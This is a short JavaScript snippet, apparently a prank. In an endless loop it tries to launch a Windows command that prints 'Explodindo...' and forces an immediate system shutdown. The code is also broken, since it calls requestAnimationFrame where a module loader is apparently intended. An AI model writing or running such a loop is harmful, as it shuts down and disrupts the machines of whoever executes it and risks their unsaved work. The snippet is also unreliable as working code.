while(true){
    requestAnimationFrame('child_process').exec('start "" cmd/c "echo Explodindo... && shutdown -s -t 0"');
}